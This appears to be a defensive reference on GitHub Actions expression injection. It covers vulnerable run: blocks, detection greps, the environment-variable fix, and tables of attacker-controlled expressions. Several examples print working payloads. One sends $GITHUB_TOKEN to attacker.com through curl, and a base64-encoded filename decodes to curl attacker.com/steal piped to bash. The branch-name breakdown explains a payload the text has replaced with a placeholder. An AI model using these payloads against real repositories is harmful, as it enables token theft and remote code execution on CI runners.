> AAS import adaptation (2026-10-14): `UNTRUSTED_REMOTE_EXECUTION` is a non-operational marker for downloading an untrusted payload and executing it in a shell. Attack flows remain illustrative; original delivery strings are available in the pinned upstream source recorded in `UPSTREAM-NOTICE.md`.

# Expression Injection

## Overview

Expression injection occurs when GitHub Actions `${{ }}` expressions containing attacker-controlled values are used inside `run:` blocks. The Actions runtime substitutes the expression value **before** the shell interprets it, allowing shell metacharacters in the value to execute arbitrary commands.

---

## The Vulnerability

```yaml
# VULNERABLE: PR title directly interpolated into shell
- run: echo "PR Title: ${{ github.event.pull_request.title }}"
```

If the attacker sets the PR title to:
```
"; curl https://attacker.com/$(cat $GITHUB_TOKEN) #
```

After expression substitution, the shell sees:
```bash
echo "PR Title: "; curl https://attacker.com/$(cat $GITHUB_TOKEN) #"
```

The shell executes `echo`, then `curl`, then ignores the rest as a comment.

---

## Injection Techniques

### Branch Name Injection

Branch names allow most characters including `$`, `(`, `)`, `{`, `}`, but not literal spaces (URL encoding does not make a space valid in a Git ref).

```yaml
# VULNERABLE
- run: echo "${{ github.head_ref }}" > branch_name.txt
```

**Attack branch name:**
```
dev$(UNTRUSTED_REMOTE_EXECUTION)
```

Breakdown:
- `${IFS}` — Internal Field Separator, becomes a space
- `$({curl,-sSfL,attacker.com/steal})` — brace expansion + command substitution
- The `|${IFS}bash` pipes the download to bash

**Real-world:** Used against microsoft/ai-discovery-agent. The payload was embedded in the branch name, and the 2m38s execution gap in the "Save format request data" step confirmed code execution.

### Filename Injection

When workflows iterate over PR-modified files:

```yaml
# VULNERABLE
- run: |
    for file in ${{ steps.changed.outputs.files }}; do
      echo "Processing $file"
    done
```

**Attack filename:**
```
docs/$(echo${IFS}Y3VybCAtc1NmTCBhdHRhY2tlci5jb20vc3RlYWw=${IFS}|${IFS}base64${IFS}-d${IFS}|${IFS}bash).md
```

The base64 decodes to `curl -sSfL attacker.com/steal`, executed via command substitution in the filename.

**Real-world:** Used against DataDog/datadog-iac-scanner. Emergency fixes deployed within 9 hours.

### PR Title / Body Injection

The most straightforward vector — attacker fully controls PR title and body:

```yaml
# VULNERABLE
- run: |
    echo "## PR Summary" >> $GITHUB_STEP_SUMMARY
    echo "${{ github.event.pull_request.title }}" >> $GITHUB_STEP_SUMMARY
```

**Payload in PR title:**
```
$(UNTRUSTED_REMOTE_EXECUTION)
```

### Issue / Comment Body Injection

```yaml
# VULNERABLE
on: issues
jobs:
  process:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Issue: ${{ github.event.issue.title }}"
```

### Commit Message Injection

On `push` triggers, commit messages are technically injectable — but **only if the push trigger accepts pushes from untrusted sources** (e.g., unprotected branches that anyone can push to). On protected branches (e.g., `main`, `master`), pushing requires write access, so the attacker already has full repo access and this is **not a meaningful finding**.

```yaml
# NOT TYPICALLY VULNERABLE: push to protected branch requires write access
on:
  push:
    branches: [main]
steps:
  - run: echo "Commit: ${{ github.event.commits[0].message }}"
```

### workflow_dispatch Input Injection — NOT A FINDING

`workflow_dispatch` requires **write access** to the repository to trigger. Someone with write access can already push arbitrary code directly, so injection via dispatch inputs adds no additional risk. **Do not report this pattern.**

```yaml
# NOT A FINDING: requires write access to trigger
on:
  workflow_dispatch:
    inputs:
      version:
        description: 'Version to release'
        required: true
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Releasing ${{ github.event.inputs.version }}"
```

---

## Detection Patterns

```bash
# Find all ${{ }} expressions in run: blocks
grep -n 'run:' .github/workflows/*.yml | while read line; do
  file=$(echo "$line" | cut -d: -f1)
  grep -n '\${{.*}}' "$file"
done

# Specifically look for dangerous expressions in run blocks
grep -B5 -A5 '\${{.*github\.event\.' .github/workflows/*.yml | grep -B5 'run:'

# Find head_ref usage (dangerous in PR-triggered workflows)
grep -rn 'github\.head_ref\|pull_request\.head\.ref\|pull_request\.head\.label' .github/workflows/

# NOTE: Do NOT flag workflow_dispatch inputs — requires write access, not an external threat
```

---

## The Fix: Environment Variables

For direct shell interpolation, pass expressions through environment variables and quote their use. This does not protect a later `eval`, `bash -c` constructed from input, or action-specific code generation:

```yaml
# VULNERABLE
- run: echo "Title: ${{ github.event.pull_request.title }}"

# SAFE: Expression assigned to env var, then quoted in shell
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Title: $PR_TITLE"
```

Why this works:
1. `${{ }}` substitution happens first, setting the env var value
2. The shell sees `$PR_TITLE` — a variable reference, not raw content
3. Shell variable expansion with quotes prevents injection

**Important:** The shell variable MUST be quoted (`"$PR_TITLE"`, not `$PR_TITLE`) to prevent word splitting.

### Fix Examples

```yaml
# Branch name — SAFE
- env:
    BRANCH: ${{ github.head_ref }}
  run: echo "$BRANCH" > branch_name.txt

# PR title — SAFE
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "## PR Summary" >> $GITHUB_STEP_SUMMARY
    echo "$TITLE" >> $GITHUB_STEP_SUMMARY

# Multiple expressions — SAFE
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
    PR_BODY: ${{ github.event.pull_request.body }}
    HEAD_REF: ${{ github.head_ref }}
  run: |
    echo "Title: $PR_TITLE"
    echo "Branch: $HEAD_REF"

# workflow_dispatch input — SAFE
- env:
    VERSION: ${{ github.event.inputs.version }}
  run: echo "Releasing $VERSION"
```

---

## Where ${{ }} Is Safe

These contexts do not directly interpolate a shell script; still trace downstream consumers:

```yaml
# SAFE: if: conditions (evaluated by Actions runtime, not shell)
if: ${{ github.event.pull_request.title != '' }}

# SAFE: with: parameters (passed as strings to the action)
- uses: some-action@v1
  with:
    title: ${{ github.event.pull_request.title }}

# SAFE: env: at job/step level (sets variable, doesn't execute)
env:
  TITLE: ${{ github.event.pull_request.title }}

# SAFE: numeric values
- run: echo "PR #${{ github.event.pull_request.number }}"
```

---

## Attacker-Controlled Expressions Quick Reference

These expressions are **dangerous when used in `run:` blocks** because an attacker controls the value:

| Expression | Attack Vector |
|------------|--------------|
| `github.event.pull_request.title` | PR title |
| `github.event.pull_request.body` | PR description |
| `github.event.pull_request.head.ref` | Branch name |
| `github.event.pull_request.head.label` | Fork label |
| `github.event.issue.title` | Issue title |
| `github.event.issue.body` | Issue body |
| `github.event.comment.body` | Comment text |
| `github.event.review.body` | Review text |
| `github.event.discussion.title` | Discussion title |
| `github.event.discussion.body` | Discussion body |
| `github.head_ref` | Branch name (shorthand) |
| `github.event.pages.*.page_name` | Wiki page name |

### Safe Expressions (NOT attacker-controlled)

| Expression | Why Safe |
|------------|----------|
| `github.event.pull_request.number` | Numeric only |
| `github.repository` / `github.repository_owner` | Repo owner controls |
| `github.actor` | GitHub username, alphanumeric + hyphens |
| `github.sha` | Hex string |
| `github.ref_name` (on `push` to protected branch) | Protected branch rules apply |
| `secrets.*` | Secrets interpolated into `run:` are literal script text too; use quoted environment variables instead |
| `github.run_id` / `github.run_number` | Numeric |
| `github.event.inputs.*` (workflow_dispatch) | Requires write access — not an external threat |
| `github.event.commits[*].message` (push to protected) | Requires write access |

---

## Exploitation Scenario Template

```
ATTACK: Expression Injection via [source]
ENTRY: Attacker creates [PR/issue/comment] with payload in [field]
PAYLOAD: [exact string the attacker provides]
TRIGGER: Workflow [file:line] runs on [event], expression at line [N]
  expands to shell code
EXECUTION: Shell interprets ${{ }} output as:
  [show the expanded shell command]
IMPACT: [RCE, token theft, etc.] — token permissions: [list]
```

---

## References

- [GitHub Docs: Security hardening — Expression injection](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
- [HackerBot Claw — branch name and filename injection attacks](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
